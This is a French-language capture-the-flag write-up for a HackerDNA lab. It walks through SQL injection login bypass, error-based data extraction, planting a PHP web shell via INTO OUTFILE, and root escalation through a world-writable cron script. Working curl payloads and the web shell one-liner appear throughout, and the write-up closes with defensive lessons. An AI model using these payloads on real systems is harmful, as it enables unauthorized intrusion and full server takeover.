# Compte rendu : Query Quake

Plateforme : HackerDNA (https://hackerdna.com/labs/query-quake)
Auteur : SRH
Difficulté : Moyenne
Tags : SQL Injection, MySQL, MariaDB, Authentication Bypass, INTO OUTFILE, Web Shell, Cron, Privilege Escalation
XP : +400 XP

## Scénario
Un serveur web NexaTech Solutions expose une application cachée derrière une page statique. L'objectif est d'exploiter une injection SQL dans le formulaire de login pour contourner l'authentification, d'écrire un web shell via INTO OUTFILE, de récupérer le flag utilisateur, puis d'escalader vers root en abusant d'un script cron world-writable exécuté par root.

Prérequis : connaissances de base en SQL, fondamentaux des applications web, bases de la ligne de commande Linux, compréhension des requêtes HTTP.

## Chaîne d'Attaque
[Reconnaissance] → [Découverte de /webadmin] → [Injection SQL (auth bypass)] → [Extraction de données] → [RCE via INTO OUTFILE] → [Flag user] → [Énumération cron] → [Escalade root] → [Flag root] → 🚩

## Étape 1 — Reconnaissance
Le scan Nmap révèle uniquement le port 80 (Apache 2.4.59 sur Debian). Le site public est entièrement statique. Un scan de répertoires avec gobuster ou ffuf révèle un chemin caché /webadmin qui redirige vers une page de login.

gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt
# → /webadmin (Status: 301)

Le formulaire de login poste vers /webadmin/index.php avec les champs username et password.

## Étape 2 — Injection SQL (Auth Bypass)
Un test classique avec une apostrophe révèle la vulnérabilité. Le payload admin' OR '1'='1' -- - permet de contourner l'authentification et d'accéder au dashboard admin.

curl -X POST http://<IP>/webadmin/index.php \
  -d "username=admin' OR '1'='1' -- -&password=x"

Le code source (/var/www/html/webadmin/index.php) confirme la requête vulnérable : SELECT * FROM auth WHERE pwd='...' AND username='...'.

## Étape 3 — Fingerprinting de l'injection
On détermine le nombre de colonnes avec ORDER BY. La requête retourne 2 colonnes.

# Fonctionne
curl -X POST http://<IP>/webadmin/index.php -d "username=admin' ORDER BY 2 -- -&password=x"

# Échoue
curl -X POST http://<IP>/webadmin/index.php -d "username=admin' ORDER BY 3 -- -&password=x"
# → Unknown column '3' in 'order clause'

Une injection UNION avec 2 colonnes est donc possible : x' UNION SELECT 1,2 -- -.

## Étape 4 — Extraction de données via erreur XPATH
L'application n'affiche pas les valeurs SELECT, mais on peut utiliser EXTRACTVALUE pour déclencher une erreur XPATH qui révèle nos données.

# Version de la base
curl -X POST http://<IP>/webadmin/index.php \
  -d "username=x' UNION SELECT 1,EXTRACTVALUE(1,CONCAT(0x7e,@@version)) -- -&password=x"
# → XPATH syntax error: '~10.11.6-MariaDB-0+deb12u1'

On utilise LOAD_FILE() pour lire le code source de index.php et récupérer les identifiants de la base et la commande system() qui lit le flag root.

## Étape 5 — RCE via INTO OUTFILE
L'utilisateur MySQL possède le privilège FILE et secure_file_priv est vide. On écrit un web shell PHP directement dans le répertoire web.

curl -X POST http://<IP>/webadmin/index.php \
  -d "username=x' UNION SELECT 1,\"<?php echo shell_exec(\\\$_GET['c']); ?>\" INTO OUTFILE '/var/www/html/s.php' -- -&password=x"

Test de l'exécution de commandes :

curl "http://<IP>/s.php?c=id"
# → uid=33(www-data) gid=33(www-data)

## Étape 6 — Flag utilisateur
On lit le flag utilisateur via le web shell.

curl "http://<IP>/s.php?c=cat /home/flag-user.txt"

Flag User : <USER_FLAG>

## Étape 7 — Énumération cron et escalade root
On cherche des scripts exécutés par cron en root. Un fichier world-writable est trouvé à la racine : /supervisord.cron.

curl "http://<IP>/s.php?c=ls -la /supervisord.cron"
# → -rwx-wx-wx. 1 root root 73 /supervisord.cron

Ce script est exécuté par cron en root toutes les minutes. On l'écrase avec un script qui copie le flag root vers un emplacement lisible.

curl "http://<IP>/s.php?c=echo 'cp /root/flag-root.txt /tmp/rootflag && chmod 666 /tmp/rootflag' > /supervisord.cron"

On attend le passage du cron (max 60 secondes), puis on lit le flag :

sleep 60
curl "http://<IP>/s.php?c=cat /tmp/rootflag"

Flag Root : <ROOT_FLAG>

## Conclusion
Ce lab illustre une chaîne d'exploitation complète : une application cachée derrière une page statique, une injection SQL dans le formulaire de login permettant de contourner l'authentification et d'extraire les identifiants de la base, une RCE via INTO OUTFILE pour écrire un web shell, puis une escalade root via un script cron world-writable exécuté par root.

## Leçons Apprises
1. Toujours vérifier les répertoires cachés (/webadmin) qui peuvent exposer des applications vulnérables.
2. Ne jamais construire de requêtes SQL par concaténation : utiliser des requêtes préparées.
3. Restreindre les privilèges de l'utilisateur MySQL : FILE et INTO OUTFILE permettent d'écrire des fichiers sur le serveur.
4. Ne jamais laisser de scripts cron world-writable, surtout s'ils sont exécutés en root.
5. Auditer les scripts exécutés par cron pour détecter les permissions dangereuses.

Les noms des défis et toute propriété intellectuelle de tiers restent la propriété de leurs détenteurs respectifs.
